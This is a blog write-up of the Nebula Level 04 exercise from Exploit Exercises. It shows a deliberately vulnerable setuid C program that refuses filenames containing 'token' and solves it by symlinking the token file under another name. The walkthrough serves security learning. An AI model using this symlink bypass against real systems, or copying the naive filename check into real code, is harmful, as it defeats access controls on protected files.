---
layout: post
title: "Exploit Exercises - Nebula Level 04"
date: 2014-01-10 20:43:48 +0800
comments: true
categories: 
- Security
- Exercises
- Nebula
---

### About

This level requires you to read the token file, but the code restricts the files that can be read. Find a way to bypass it :)

To do this level, log in as the level04 account with the password level04 . Files for this level can be found in /home/flag04.

<!-- more -->

### Solution

Source code for /home/flag04/flag04 is 

``` c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>

int main(int argc, char **argv, char **envp)
{
  char buf[1024];
  int fd, rc;

  if(argc == 1) {
    printf("%s [file to read]\n", argv[0]);
    exit(EXIT_FAILURE);
  }

  if(strstr(argv[1], "token") != NULL) {
    printf("You may not access '%s'\n", argv[1]);
    exit(EXIT_FAILURE);
  }

  fd = open(argv[1], O_RDONLY);
  if(fd == -1) {
    err(EXIT_FAILURE, "Unable to open %s", argv[1]);
  }

  rc = read(fd, buf, sizeof(buf));
  
  if(rc == -1) {
    err(EXIT_FAILURE, "Unable to read fd %d", fd);
  }

  write(1, buf, rc);
}
```

This one is easy, just creating a soft link in the home directory of user *level04*, and making it readable for user *flag03* could bypass the check of the above code, of cause the name of the sofe link could not be *token* :-P.

``` bash
$ ln -s /home/flag04/token /home/level04/aa
$ chmod a+rx /home/level04
$ /home/flag04/flag04 /home/level04/aa
```

<!-- 06508b5e-8909-4f38-b630-fdb148a848a2 -->

And it works!

